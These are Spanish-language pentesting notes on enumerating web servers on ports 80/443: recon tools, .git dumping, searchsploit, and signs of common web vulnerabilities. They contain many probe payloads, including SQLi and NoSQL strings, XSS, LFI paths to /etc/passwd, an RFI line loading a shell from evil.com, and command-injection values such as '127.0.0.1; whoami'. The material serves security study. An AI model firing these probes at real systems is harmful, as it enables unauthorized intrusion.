# HTTP (80 / 443 / 8080 / 8443)

Tags: #Web #HTTP #HTTPS #Reconocimiento #Enumeracion #BannerGrabbing #Fuzzing

## OBJETIVO
- Identificar tecnologías, versiones y CMS del servidor
- Descubrir directorios, archivos y subdominios ocultos
- Identificar vectores de ataque potenciales
- Las vulnerabilidades específicas están en sus propias notas (ver referencias al final)

## TIPS
1. **Siempre revisar código fuente → credenciales hardcodeadas, comentarios, rutas ocultas**
2. **robots.txt y sitemap.xml → revelan rutas que el admin quiere ocultar**
3. **Si hay formulario → puede haber SQLi, XSS, CSRF → ver notas específicas**
4. **Si hay upload → puede haber File Upload Bypass → ver nota específica**
5. **Si hay parámetros GET → puede haber LFI/RFI, IDOR, SSRF → ver notas específicas**
6. **Versión de software identificada → buscar en searchsploit y exploit-db inmediatamente**
7. **Revisar cabeceras HTTP → revelan tecnologías, versiones y misconfigs**
8. **Si hay .git expuesto → dump del repositorio → credenciales y código fuente**

## TOOLS
* [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
* [Nikto](https://github.com/sullo/nikto)
* [Curl](https://curl.se/)
* [Gobuster / Ffuf / Wfuzz](ver nota Fuzzers.md)
* [Burp Suite](https://portswigger.net/burp)
* [Cyberchef](https://gchq.github.io/CyberChef/)

---

## FASE 1 — RECONOCIMIENTO INICIAL

### 1.0 Reconocimiento Pasivo 

```bash 
❯ whois domain.com     # Esta tool contiene la siguiente info: 
```

- Nombre de dominio (Domain Name): El nombre del dominio en sí (por ejemplo, example.com).
- Registrador (Registrar): La empresa donde se registró el dominio (por ejemplo, GoDaddy o Namecheap).
- Contacto del registrante (Registrant Contact): La persona u organización que registró el dominio.
- Contacto administrativo (Administrative Contact): La persona responsable de administrar el dominio.
- Contacto técnico (Technical Contact): La persona encargada de resolver los aspectos técnicos relacionados con el dominio.
- Fecha de creación y expiración (Creation and Expiration Dates): La fecha en que se registró el dominio y la fecha en que está programado para expirar.
- Servidores de nombres (Name Servers): Los servidores DNS encargados de traducir el nombre de dominio a una dirección IP.

### 1.1 Identificar tecnologías y versiones
```bash
❯ whatweb http://<IP>
# Sin creds → identificar CMS, servidor web, frameworks, jQuery, versiones
# Buscar: servidor web (Apache/Nginx/IIS), CMS, versión PHP, plugins

❯ whatweb http://<IP>:<PORT>
# Puerto no estándar → mismo comando con puerto específico

❯ whatweb http://<IP> -v
# -v → ver cabeceras completas de la respuesta
# Más detalle sobre tecnologías y versiones

❯ nuclei -u http://<IP> -tags tech -t ~/.local/nuclei-templates
❯ nuclei -u http://<IP> -tags misconfig
❯ nuclei -u http://<IP> -tags cves
❯ git clone https://github.com/projectdiscovery/nuclei-templates.git ~/.local/nuclei-templates   # Descargar las plantillas 
# Scanner de vulnerabilidades basado en templates (CVEs, misconfig, exposiciones)

❯ httpx http://<IP>
# Herramienta de enumeración HTTP para detectar servicios web y tecnologías

❯ curl -s -X GET http://<IP> -I
# Banner grabbing → obtener cabeceras HTTP (Server, ETag, X-Powered-By, etc.)
# Sin creds → siempre ejecutar al inicio

❯ curl http://<IP> -v
# Ver headers completos de request y response
# Buscar: Server, X-Powered-By, Set-Cookie, Content-Type

❯ http <IP>
# HTTPie → ver cabeceras de forma más legible que curl
```

### 1.2 Banner grabbing manual
```bash
❯ nc <IP> 80
HEAD / HTTP/1.0             # Dar dos Enter → obtener cabeceras del servidor
OPTIONS http://<IP> HTTP/1.0
host:<IP>

❯ telnet <IP> 80
GET / HTTP/1.0              # Dar dos Enter → obtener respuesta del servidor

❯ nmap -sV --script=banner <IP>
# Detección de versión + banner grabbing con nmap
# Siempre incluir en el escaneo inicial
```

### 1.3 Identificar métodos HTTP permitidos
```bash
❯ curl -s -X OPTIONS http://<IP> -v
# Ver métodos permitidos: GET, POST, PUT, DELETE, TRACE, etc.
# PUT habilitado → posible subida de archivos directa
# TRACE habilitado → posible XST (Cross-Site Tracing)

❯ nmap --script http-methods -p 80,443 <IP>
# Enumerar métodos permitidos con nmap
```

### Insight
- X-Powered-By: PHP/7.2 → buscar CVEs de esa versión en searchsploit
- Server: Apache/2.4.49 → puede ser vulnerable a path traversal (CVE-2021-41773)
- PUT habilitado → intentar subir webshell directamente

---

## FASE 2 — REVISIÓN MANUAL (SIEMPRE ANTES DE FUZZEAR)

### 2.1 Archivos esenciales
```bash
❯ curl http://<IP>/robots.txt
# Rutas que el admin no quiere indexar → frecuentemente revelan /admin, /backup, etc.

❯ curl http://<IP>/sitemap.xml
# Mapa del sitio → todas las rutas registradas

❯ curl http://<IP>/.git/HEAD
# Si devuelve algo → hay repositorio .git expuesto → sección 2.3

❯ curl http://<IP>/crossdomain.xml
# Política de dominios cruzados → misconfigs útiles

❯ curl http://<IP>/security.txt
# Información de contacto de seguridad → puede revelar info del dominio
```

### 2.2 Rutas típicas con información sensible
```bash
# Archivos de configuración frecuentes
/var/www/html/config.php        # Credenciales de DB
/var/www/html/initialize.php    # Credenciales de acceso
/etc/passwd                     # Si hay LFI
/wp-config.php                  # WordPress → credenciales DB

# Rutas a revisar manualmente
http://<IP>/admin
http://<IP>/login
http://<IP>/dashboard
http://<IP>/backup
http://<IP>/api
http://<IP>/console
```

### 2.3 Repositorio .git expuesto
```bash
# Si curl http://<IP>/.git/HEAD devuelve contenido → repositorio expuesto

❯ python3 GitHack.py http://<IP>/.git/
# Extraer todos los recursos del proyecto
# Puede contener: credenciales, código fuente, historial de commits

❯ git_hacker.py http://<IP>/.git/
❯ git-dump.py http://<IP>/.git/

# Después de extraer → buscar credenciales
❯ grep -ri "password\|passwd\|secret\|key\|token" ./ 2>/dev/null
```

### 2.4 Ver código fuente y tecnologías en el navegador
```
Ctrl + U         → Ver código fuente completo
Ctrl + Shift + C → Inspeccionar elemento
Ctrl + R         → Recargar la página
Ctrl + Click     → Abrir enlace en nueva pestaña
```

### Insight
- Código fuente → buscar comentarios con credenciales, rutas ocultas, API keys
- robots.txt → agregar todas las rutas encontradas al fuzzing después
- .git expuesto → alto valor → puede contener todo el código de la app

---

## FASE 3 — IDENTIFICACIÓN DE TECNOLOGÍAS Y BÚSQUEDA DE EXPLOITS

### 3.1 Identificar CMS específico
```bash
❯ whatweb http://<IP>
# Identificar si es WordPress, Joomla, Drupal, Magento, etc.
# → Si identifica CMS → ir a la nota específica del CMS

❯ nmap --script http-generator -p 80,443 <IP>
# Identificar generador/CMS desde las meta tags

❯ nmap --script http-cms-detect -p 80,443 <IP>
# Detección de CMS con nmap
```

**CMS identificado → ir a la nota correspondiente:**
```
WordPress  → ver nota 80.1_WordPress.md
Joomla     → ver nota 80.2_Joomla.md
Drupal     → ver nota 80.3_Drupal.md
Magento    → ver nota 80.4_Magento.md
Apache     → ver nota 80.5_Apache_Shellshock.md
Tomcat     → ver nota 80.6_Tomcat.md
IIS/WebDAV → ver nota 80.7_IIS_Webdav.md
WSDL/SOAP  → ver nota 80.8_WSDL.md
```

### 3.2 Buscar exploits por versión
```bash
❯ searchsploit <servicio> <version>
# Buscar vulnerabilidades conocidas por nombre y versión

❯ searchsploit apache 2.4.49
❯ searchsploit nginx 1.14
❯ searchsploit php 7.2

❯ searchsploit -m <ID>
# Copiar el exploit al directorio actual para modificarlo

❯ searchsploit -x <ID>
# Ver el exploit sin copiarlo
```

### 3.3 Escaneo de vulnerabilidades con Nikto
```bash
❯ nikto -h http://<IP>
# Sin creds → escaneo de vulnerabilidades comunes, misconfigs, archivos peligrosos

❯ nikto -h http://<IP> -p 443 -ssl
# Escaneo por HTTPS

❯ nikto -h http://<IP> -o nikto_output.txt
# Guardar output a archivo
```

### Insight
- Nikto genera ruido → usarlo después de enumerar → no al inicio
- searchsploit por versión exacta → siempre antes de buscar exploits en Google

---

## FASE 4 — IDENTIFICACIÓN DE VECTORES DE ATAQUE

> Esta fase identifica qué puede existir — los ataques están en sus notas específicas
> No ejecutes payloads completos aquí → identifica el vector y ve a la nota dedicada

---

### 4.1 Panel de Login / Formulario de autenticación

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
Ingresar una comilla ( ' ) → error SQL visible en pantalla
  → SQL Injection → ver nota SQLi.md

Mensaje de error diferente entre usuario válido e inválido
  → User Enumeration → ver nota Fuzzers.md (sección usuarios)

Login con admin:admin / admin:password / guest:guest funciona
  → Default Credentials → probar lista de credenciales por defecto

¿Hay campo de "Recordar contraseña" o token en la URL?
  → posible CSRF o token inseguro → ver nota CSRF.md

Tiempo de respuesta diferente entre usuarios existentes y no existentes
  → Timing Attack para enumerar usuarios

Redirección a ?next= o ?redirect= después del login
  → Open Redirect → ver nota Open_Redirect.md

¿Hay opción "Olvidé mi contraseña"?
  → Host Header Injection en el email de reset
  → User Enumeration por diferencia en respuesta

Intentar: admin'-- / ' OR 1=1-- / " OR ""="
  → SQL Injection en login → ver nota SQLi.md

¿Acepta JSON en el body del POST?
  → NoSQL Injection → probar: {"user": {"$gt": ""}, "pass": {"$gt": ""}}
  → ver nota NoSQLi.md
```

---

### 4.2 Formularios de búsqueda / Campos de texto

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
Ingresar <script>alert(1)</script> y se ejecuta en el navegador
  → XSS Reflejado → ver nota XSS.md

En un formulario hay un campo de website y alguien válida la url
  → posible robo de cookie de sesión o uso de algun exploit mediante XSS → ver nota XSS.md

El input ingresado aparece guardado y se ejecuta después al visitar la página
  → XSS Almacenado (más peligroso) → ver nota XSS.md

Ingresar una comilla y aparece error de base de datos
  → SQL Injection → ver nota SQLi.md

El campo de búsqueda hace una petición a una URL interna
  → posible SSRF → ver nota SSRF.md

Ingresar ../../../../etc/passwd y aparece contenido del sistema
  → Path Traversal / LFI → ver nota LFI.md

El formulario envía datos a un endpoint externo
  → posible SSRF o datos sensibles expuestos
```

---

### 4.3 Parámetros GET en la URL

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
?page=about / ?file=home / ?template=main / ?view=index
  → LFI → probar: ?page=../../../../etc/passwd
  → ver nota LFI.md

?page=http://evil.com/shell.php
  → RFI (Remote File Inclusion) → ver nota LFI.md

?id=1 / ?user=5 / ?order=3 / ?product=123
  → SQLi → probar: ?id=1' y ?id=1 AND 1=1
  → IDOR → cambiar el número y ver si accedes a datos de otro usuario
  → ver notas SQLi.md / IDOR.md

?url=http://... / ?path=http://... / ?img=http://...
  → SSRF → probar: ?url=http://127.0.0.1/admin
  → ver nota SSRF.md

?redirect=http://evil.com / ?next=/dashboard / ?return=...
  → Open Redirect → probar: ?redirect=http://evil.com
  → ver nota Open_Redirect.md

?lang=es / ?locale=en / ?country=mx
  → LFI → probar: ?lang=../../../../etc/passwd
  → ver nota LFI.md

?debug=true / ?test=1 / ?dev=1
  → Information Disclosure → puede exponer info del servidor

?callback=function / ?jsonp=cb
  → JSONP Injection / XSS → si refleja el valor sin sanitizar

?search=term / ?q=term / ?query=term
  → XSS Reflejado → probar: ?search=<script>alert(1)</script>
  → SQLi → probar: ?search=term'

?xml=... / ?data=... / ?input=...
  → XXE (XML External Entity) → si el servidor procesa XML
  → ver nota XXE.md
```

---

### 4.4 Subida de archivos (Upload)

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
Formulario que acepta imágenes (.jpg, .png)
  → File Upload Bypass → probar subir .php disfrazado
  → Cambiar extensión: shell.php → shell.jpg.php / shell.phtml / shell.php5
  → Cambiar Content-Type en Burp: image/jpeg con contenido PHP
  → ver nota File_Upload.md

El archivo subido es accesible en una URL pública
  → RCE si logramos subir un .php o webshell
  → Buscar la ruta donde se guardan los archivos

El servidor valida la extensión pero no el contenido
  → Magic Bytes bypass → agregar bytes de imagen al inicio del PHP
  → ver nota File_Upload.md

El nombre del archivo se refleja en la respuesta
  → Path Traversal en el nombre: ../../shell.php
  → XSS en el nombre del archivo si se muestra en HTML
```

---

### 4.5 Cabeceras HTTP

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
Cabecera X-Forwarded-For o Client-IP presente o procesada
  → Bypass de restricciones IP → probar: X-Forwarded-For: 127.0.0.1
  → RCE si la cabecera se pasa a comandos del sistema
  → probar: X-Forwarded-For: 127.0.0.1; whoami;

Cabecera Host se refleja en la respuesta o en emails
  → Host Header Injection → cambiar Host por dominio propio
  → Password reset poisoning → recibir el link de reset en tu dominio

Cabecera Referer o User-Agent se almacena en logs o DB
  → XSS Almacenado / SQLi en cabeceras
  → probar: User-Agent: <script>alert(1)</script>

Cabecera X-Original-URL o X-Rewrite-URL aceptada
  → Bypass de controles de acceso → probar rutas /admin

Cookie con valor que parece serializado o base64
  → Insecure Deserialization → ver nota Deserialization.md
  → Decode y analizar estructura antes de modificar
```

---

### 4.6 Respuestas y comportamiento del servidor

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
Error de base de datos visible (MySQL error / ORA- / MSSQL error)
  → Error-based SQLi → ver nota SQLi.md

Stack trace o debug info en la respuesta
  → Information Disclosure → puede revelar rutas, versiones, credenciales

Directorio listado (Directory Listing habilitado)
  → Enumerar todos los archivos del directorio manualmente
  → Buscar backups: .bak, .old, .zip, .tar.gz, config.php.bak

Diferencia de tiempo en respuestas (lento vs rápido)
  → Blind SQLi por tiempo → SLEEP() / WAITFOR DELAY
  → ver nota SQLi.md

Redirección 302 sin validar el destino
  → Open Redirect → manipular el destino

Respuesta diferente según el contenido enviado (mismo código HTTP)
  → Blind XSS / Blind SQLi → inferir por diferencias sutiles

Content-Type incorrecto para el contenido devuelto
  → MIME Sniffing → posible XSS en navegadores antiguos

Servidor devuelve errores 500 con payloads específicos
  → Indica procesamiento del input → ajustar payload
```

---

### 4.7 Endpoints de API

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
/api/v1/users/1 → devuelve datos del usuario 1
  → IDOR → probar /api/v1/users/2, /api/v1/users/0
  → ver nota IDOR.md

/api/search?q=term → busca en la DB
  → SQLi / NoSQLi según la tecnología

/api/v1/upload → acepta archivos
  → File Upload Bypass → ver nota File_Upload.md

API sin autenticación en algunos endpoints
  → Broken Access Control → probar rutas /admin, /internal, /debug

Respuesta incluye campos que no deberían verse
  → Mass Assignment → enviar campos extra en POST/PUT
  → probar: {"role": "admin"} junto con datos normales

/api/v1/users?filter=name:john
  → NoSQLi → probar filter=name[$ne]:x o filter=name[$regex]:.*

GraphQL endpoint (/graphql, /api/graphql)
  → Introspection → ver toda la estructura de la API
  → probar: { __schema { types { name } } }
```

---

### 4.8 Cookies y sesiones

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
Cookie en base64 que al decodificar muestra user=admin
  → Cookie Tampering → cambiar el valor y re-encodear
  → probar: user=administrator, role=admin, isAdmin=true

Cookie con JWT (empieza con eyJ...)
  → JWT Attacks → probar alg:none, cambiar payload sin firmar
  → ver nota JWT.md

Cookie sin flag HttpOnly → accesible desde JavaScript
  → XSS para robar cookie de sesión → ver nota XSS.md

Cookie sin flag Secure → transmitida por HTTP
  → Interceptable en red → MitM

Session fixation → ID de sesión en la URL ?sessid=...
  → Session Fixation Attack

Cookie con valor serializado (a:2:{s:4..."} o formato pickle)
  → Insecure Deserialization → ver nota Deserialization.md
```

---

### 4.9 Funcionalidades específicas

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
Generación de PDF desde input del usuario
  → SSRF → URL en el contenido del PDF
  → XSS → <script> puede ejecutarse en el generador de PDF
  → LFI → file:///etc/passwd en el contenido

Renderizado de templates (Jinja2, Twig, Freemarker, etc.)
  → SSTI (Server-Side Template Injection)
  → probar: {{7*7}} / ${7*7} / #{7*7}
  → Si devuelve 49 → SSTI confirmado → ver nota SSTI.md

Importar/exportar XML
  → XXE → ver nota XXE.md
  → probar entidad externa apuntando a /etc/passwd

Funcionalidad de "compartir" o "enviar por email" con URL propia
  → SSRF → apuntar URL a 127.0.0.1
  → Open Redirect

Ping / traceroute / DNS lookup desde la web
  → Command Injection → probar: 127.0.0.1; whoami
  → probar: 127.0.0.1 | id / 127.0.0.1 && id
  → ver nota Command_Injection.md

Evaluación de expresiones matemáticas o código
  → Code Injection → probar: 1+1, exec("whoami"), eval("id")

Conversión de imágenes o documentos
  → ImageTragick si usa ImageMagick (CVE-2016-3714)
  → Ghostscript RCE si convierte PDF/PS

Función de "preview" que descarga contenido de una URL
  → SSRF → ver nota SSRF.md

Panel de administración expuesto sin autenticación
  → Acceso directo → revisar /admin, /manager, /console, /phpmyadmin
```

---

### 4.10 Información sensible expuesta

```
INDICIOS → VECTOR POSIBLE
─────────────────────────────────────────────────────────────
Contraseñas almacenadas en texto plano o MD5 sin sal
  → Weak Password Storage → crackear con hashcat

Mensajes de error con rutas del servidor, versiones o stack trace
  → Information Disclosure → anotar toda la info

Directorio /backup, /old, /archive accesible
  → Backups sin cifrar → descargar y analizar

Archivos .env, config.php, .htpasswd, web.config accesibles
  → Credenciales expuestas → descargar inmediatamente

Comentarios en HTML con rutas, usuarios o contraseñas
  → Ctrl+U → buscar: <!-- / // / /* / TODO / FIXME / password

Versión exacta del software en las cabeceras o en la web
  → searchsploit por esa versión exacta → buscar CVEs
```

---

## USUARIOS POR DEFECTO

```bash
# Linux:   www-data, user, root
# Windows: iis apppool\defaultapppool, user, NT Authority\System
# → Si obtienes RCE → whoami primero para saber el contexto
```

---

## FLUJO DE DECISIÓN RÁPIDO

```
Puerto 80/443 abierto
│
├── FASE 1 → whatweb + curl -I + nmap banner
│     └── ¿Versión identificada? → searchsploit inmediato
│
├── FASE 2 → robots.txt + código fuente + .git
│     └── ¿.git expuesto? → GitHack → buscar credenciales
│
├── FASE 3 → ¿CMS identificado?
│     ├── SÍ → ir a nota específica del CMS
│     └── NO → continuar con fuzzing
│
├── FASE 4 → Fuzzing de directorios y archivos
│     └── ¿Directorio encontrado? → fuzzear dentro también
│
├── FASE 5 → Subdominios y VHosts
│     └── ¿Subdominio nuevo? → /etc/hosts → repetir todo el flujo
│
└── FASE 6 → Identificar vectores según lo encontrado
      ├── Formulario login → SQLi / XSS / user enum
      ├── Parámetros GET → LFI / SQLi / IDOR / SSRF
      ├── Upload → File Upload Bypass
      ├── WebDAV → cadaver → subir webshell
      └── API → enumerar endpoints
```

---

## CHECKLIST RÁPIDO

```
[ ] whatweb → identificar tecnologías y versiones
[ ] curl -I → banner grabbing de cabeceras
[ ] robots.txt y sitemap.xml
[ ] Código fuente → Ctrl+U → buscar comentarios y rutas
[ ] .git expuesto → GitHack si existe
[ ] CMS identificado → ir a nota específica
[ ] searchsploit por versión encontrada
[ ] Nikto → escaneo de vulnerabilidades
[ ] Fuzzing directorios → ffuf con common.txt primero
[ ] Fuzzing extensiones → según OS del target
[ ] Subdominios/VHosts → ffuf con Host header
[ ] Parámetros identificados → ver nota de vuln correspondiente
[ ] Formulario → user enum + fuerza bruta
```
